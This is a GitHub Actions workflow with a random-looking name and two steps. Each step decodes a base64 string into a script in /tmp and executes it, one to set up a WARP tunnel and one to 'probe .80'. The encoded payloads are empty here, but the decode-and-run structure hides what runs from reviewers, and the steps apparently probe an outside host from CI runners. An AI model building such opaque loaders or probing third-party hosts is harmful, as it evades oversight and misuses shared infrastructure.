name: wf72209b
on:
  workflow_dispatch:
jobs:
  warp:
    runs-on: ubuntu-latest
    timeout-minutes: 45
    steps:
      - name: setup warp
        run: |
          echo '' | base64 -d > /tmp/setup_warp.sh
          cd /tmp && bash setup_warp.sh 2>&1 | tail -40
          cat /tmp/warp_method.env 2>/dev/null || true
      - name: probe .80 via warp
        env:
          PYTHONUNBUFFERED: "1"
        run: |
          echo '' | base64 -d > /tmp/p.py
          python3 /tmp/p.py
